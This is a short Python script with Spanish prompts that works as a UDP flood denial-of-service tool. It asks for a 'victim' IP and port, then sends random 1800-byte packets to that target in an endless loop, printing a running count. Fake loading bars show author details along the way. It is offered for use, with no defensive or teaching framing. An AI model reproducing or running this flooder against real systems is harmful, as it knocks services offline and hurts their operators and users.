import random
import socket
import time

# Generar bytes aleatorios
random_bytes = random._urandom(1800)

# Crear un socket UDP
sockett = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

print("Ingresa la IP víctima")
ip = input("IP VICTIMA>")

print("Ingresa el puerto")
puerto = int(input("PUERTO>"))

print("Ingresa el tamaño")
tamaño = int(input("TAMAÑO BYTES:"))

# Inicializar la variable sent
sent = 0

print("[Autor = Alex]")
print("[Cargando...]")
time.sleep(3)
print("[====            ]25%")
time.sleep(2)

print("Fecha creación del script: 14/05/2024")
print("[Cargando...]")
time.sleep(3)
print("[========        ]50%")
time.sleep(2)

print("Github del autor: https://github.com/DarkSeasonGH")
print("[Cargando...]")
time.sleep(3)
print("[============    ]75%")
time.sleep(2)

print("[Edad del autor: 98 años]")
print("[================]100%")
time.sleep(2)

while True:
    sockett.sendto(random_bytes,(ip,puerto))
    print("Byte enviado")
    sent = sent + 1
    print("Bytes enviados en total: ", sent)
